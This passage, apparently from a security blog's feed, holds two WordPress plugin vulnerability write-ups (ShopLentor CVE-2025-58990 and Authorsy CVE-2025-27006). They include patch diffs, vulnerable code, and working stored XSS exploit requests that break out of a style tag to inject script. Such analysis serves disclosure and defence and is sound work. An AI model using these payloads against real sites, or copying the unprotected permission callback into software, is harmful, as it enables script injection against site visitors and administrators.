0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use a user with the &lt;strong&gt;contributor&lt;/strong&gt; role to create any post and note its ID.&lt;/p&gt;&#xA;&lt;p&gt;Send a &lt;strong&gt;POST&lt;/strong&gt; request to &lt;code&gt;http://localhost/wp-json/woolentor/v1/save_css&lt;/code&gt; with an XSS payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/woolentor/v1/save_css HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/json&#xA;&#xA;{&#xA;&amp;#34;post_id&amp;#34;:1416,&#xA;&amp;#34;has_block&amp;#34;:true,&#xA;&amp;#34;block_css&amp;#34;:&amp;#34;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Response&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;    &amp;#34;code&amp;#34;:&amp;#34;rest_forbidden&amp;#34;,&#xA;    &amp;#34;message&amp;#34;:&amp;#34;Sorry, you are not allowed to do that.&amp;#34;,&#xA;    &amp;#34;data&amp;#34;:{&#xA;        &amp;#34;status&amp;#34;:401&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 The &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; header is missing for user authorization. Open the page source (&lt;kbd&gt;Ctrl&lt;/kbd&gt;+&lt;kbd&gt;U&lt;/kbd&gt;) of the post edit page:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;view-source:http://localhost/wp-admin/post.php?post=&amp;lt;post_id&amp;gt;&amp;amp;action=edit&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Search for &lt;code&gt;wpApiSettings&lt;/code&gt; in the source and extract the &lt;code&gt;nonce&lt;/code&gt; value.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/api_search.png&#34; title=&#34;wpApiSettings&#34; data-thumbnail=&#34;/posts/2025-10-05-cve-2025-58990/api_search.png&#34; data-sub-html=&#34;&lt;h2&gt;wpApiSettings&lt;/h2&gt;&lt;p&gt;wpApiSettings&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-05-cve-2025-58990/api_search.png&#39; alt=&#34;wpApiSettings&#34; height=&#34;245&#34; width=&#34;1917&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;wpApiSettings&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Send the request including the &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; header with the obtained value:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/woolentor/v1/save_css HTTP/1.1&#xA;Host: localhost&#xA;X-WP-Nonce: f79ec79e4b&#xA;Content-Type: application/json&#xA;&#xA;{&#xA;&amp;#34;post_id&amp;#34;:1416,&#xA;&amp;#34;has_block&amp;#34;:true,&#xA;&amp;#34;block_css&amp;#34;:&amp;#34;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Preview post&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/preview.png&#34; title=&#34;Preview&#34; data-thumbnail=&#34;/posts/2025-10-05-cve-2025-58990/preview.png&#34; data-sub-html=&#34;&lt;h2&gt;Preview&lt;/h2&gt;&lt;p&gt;Preview&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-05-cve-2025-58990/preview.png&#39; alt=&#34;Preview&#34; height=&#34;467&#34; width=&#34;1266&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Preview&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 XSS succeeds. Inspect to see how the code was modified.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;View source code&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-05-cve-2025-58990/code.png&#34; title=&#34;Code&#34; data-thumbnail=&#34;/posts/2025-10-05-cve-2025-58990/code.png&#34; data-sub-html=&#34;&lt;h2&gt;Code&lt;/h2&gt;&lt;p&gt;Code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-05-cve-2025-58990/code.png&#39; alt=&#34;Code&#34; height=&#34;285&#34; width=&#34;728&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-58990&lt;/strong&gt; vulnerability in &lt;strong&gt;ShopLentor &amp;lt;= 3.2.0&lt;/strong&gt; allows a &lt;strong&gt;contributor&lt;/strong&gt; to inject malicious CSS leading to Stored XSS when an admin/author previews or views the post. The &lt;strong&gt;3.2.1&lt;/strong&gt; patch adds permission checks and CSS sanitization to prevent exploitation.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always combine &lt;strong&gt;permission checks&lt;/strong&gt; and &lt;strong&gt;input sanitization&lt;/strong&gt; when handling user-submitted data.&lt;/li&gt;&#xA;&lt;li&gt;Low-privilege roles (like &lt;strong&gt;contributor&lt;/strong&gt;) can still be an attack vector if APIs are not properly protected.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt; in WordPress commonly occurs when data saved to DB/files is rendered inline without sanitization.&lt;/li&gt;&#xA;&lt;li&gt;Timely plugin updates are a simple and effective mitigation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ShopLentor/vulnerability/wordpress-ShopLentor-plugin-1-0-5-cross-site-scripting-xss-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress ShopLentor Plugin &amp;lt;= 3.2.0 is vulnerable to Cross Site Scripting (XSS) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-27006 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-04-cve-2025-27006/</link>
      <pubDate>Sat, 04 Oct 2025 19:37:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-04-cve-2025-27006/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;The vulnerability exists in the &lt;strong&gt;Authorsy&lt;/strong&gt; plugin for WordPress prior to version &lt;strong&gt;1.0.6&lt;/strong&gt;. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-27006&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-27006&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/authorsy/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Authorsy Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.0.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;OWASP Top 10&lt;/strong&gt;: A1: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Although the description requires &lt;strong&gt;Subscriber&lt;/strong&gt; privileges, it can actually be exploited &lt;strong&gt;Unauthenticated&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Authorsy&lt;/strong&gt;: v1.0.5 (vulnerable) and v1.0.6 (patched)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any tool to compare two versions&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin allows custom CSS, stores it in &lt;code&gt;wp_options&lt;/code&gt;, and injects it directly into the &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; tag on pages. However, users can interact with the API to modify CSS without proper &lt;strong&gt;access control&lt;/strong&gt;, leading to &lt;strong&gt;Broken Access Control&lt;/strong&gt; and potential &lt;strong&gt;XSS&lt;/strong&gt; if malicious payloads are inserted.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use a diff tool to compare vulnerable and patched versions. Notice clear differences in two files: &lt;strong&gt;core/settings/api-settings.php&lt;/strong&gt; and &lt;strong&gt;core/enqueue-inline/enqueue-inline.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;File core/enqueue-inline/enqueue-inline.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function custom_inline_css()&#xA;{&#xA;    $custom_css  = &amp;#39;&amp;#39;;&#xA;    $ea_custom_css = authorsy_get_option(&amp;#39;ea_custom_css&amp;#39;);&#xA;    if(is_single()){&#xA;        $custom_css.= $ea_custom_css;&#xA;    }&#xA;    &#xA;    $custom_css .= &amp;#34;&#xA;    :root { &#xA;        --ea-color-main: $primary_color;  &#xA;    }&#xA;    &amp;#34;&#xA;    wp_add_inline_style(&amp;#39;authorsy-custom-css&amp;#39;, $custom_css);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;User data is inserted without validation, leaving it vulnerable to &lt;strong&gt;XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Patched version:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function custom_inline_css()&#xA;{&#xA;    $custom_css  = &amp;#39;&amp;#39;;&#xA;    $ea_custom_css = authorsy_get_option(&amp;#39;ea_custom_css&amp;#39;);&#xA;    if(is_single() &amp;amp;&amp;amp; !empty($ea_custom_css)){&#xA;        // Sanitize and escape to prevent XSS&#xA;        $ea_custom_css = wp_strip_all_tags($ea_custom_css);&#xA;        $ea_custom_css = esc_html($ea_custom_css);&#xA;        $custom_css.= $ea_custom_css;&#xA;    }&#xA;    &#xA;    $custom_css .= &amp;#34;&#xA;    :root { &#xA;        --ea-color-main: $primary_color;  &#xA;    }&#xA;    &amp;#34;&#xA;    wp_add_inline_style(&amp;#39;authorsy-custom-css&amp;#39;, $custom_css);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sanitization ensures only safe CSS is injected.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/diff1.png&#34; title=&#34;Diff showing changes in enqueue-inline.php to sanitize custom CSS&#34; data-thumbnail=&#34;/posts/2025-10-04-cve-2025-27006/diff1.png&#34; data-sub-html=&#34;&lt;h2&gt;diff 1&lt;/h2&gt;&lt;p&gt;Diff showing changes in enqueue-inline.php to sanitize custom CSS&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-04-cve-2025-27006/diff1.png&#39; alt=&#34;diff 1&#34; height=&#34;145&#34; width=&#34;1462&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff showing changes in enqueue-inline.php to sanitize custom CSS&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;File core/settings/api-settings.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;Vulnerable:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;    return true;&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Patched:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;    return current_user_can(&amp;#39;manage_options&amp;#39;);&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The permission callback now restricts access to &lt;strong&gt;admins&lt;/strong&gt;, mitigating &lt;strong&gt;Broken Access Control&lt;/strong&gt; and indirectly reducing &lt;strong&gt;XSS&lt;/strong&gt; risk.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/diff2.png&#34; title=&#34;Diff showing REST API permission callback changes in api-settings.php&#34; data-thumbnail=&#34;/posts/2025-10-04-cve-2025-27006/diff2.png&#34; data-sub-html=&#34;&lt;h2&gt;diff 2&lt;/h2&gt;&lt;p&gt;Diff showing REST API permission callback changes in api-settings.php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-04-cve-2025-27006/diff2.png&#39; alt=&#34;diff 2&#34; height=&#34;378&#34; width=&#34;1559&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff showing REST API permission callback changes in api-settings.php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;custom_inline_css()&lt;/code&gt; is hooked to &lt;a href=&#34;https://developer.wordpress.org/reference/hooks/wp_head/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_head&lt;/code&gt;&lt;/a&gt;. When WordPress renders the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; section, this function concatenates user options from &lt;code&gt;authorsy_get_option()&lt;/code&gt; into &lt;code&gt;$custom_css&lt;/code&gt; and adds it inline:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$custom_css  = authorsy_get_option(&amp;#39;ea_custom_css&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since this data is stored in the database, this is &lt;strong&gt;Stored XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a &lt;strong&gt;POST&lt;/strong&gt; request to &lt;code&gt;/wp-json/authorsy/v1/settings&lt;/code&gt; with an XSS payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/authorsy/v1/settings HTTP/1.1&#xA;Host: localhost&#xA;Content-Type: application/json&#xA;&#xA;{&#xA;&amp;#34;primary_color&amp;#34;:&amp;#34;&amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The payload closes the existing &lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt; and injects a &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag. Visiting any page will execute the XSS.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-04-cve-2025-27006/xss.png&#34; title=&#34;Injected XSS payload in &amp;lt;head&amp;gt; via custom CSS&#34; data-thumbnail=&#34;/posts/2025-10-04-cve-2025-27006/xss.png&#34; data-sub-html=&#34;&lt;h2&gt;XSS&lt;/h2&gt;&lt;p&gt;Injected XSS payload in &amp;lt;head&amp;gt; via custom CSS&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-04-cve-2025-27006/xss.png&#39; alt=&#34;XSS&#34; height=&#34;622&#34; width=&#34;980&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Injected XSS payload in &lt;head&gt; via custom CSS&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;&#xA;    :root { &#xA;        --ea-color-main: &amp;lt;/style&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;style&amp;gt;;  &#xA;    } &#xA;&amp;lt;/style&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 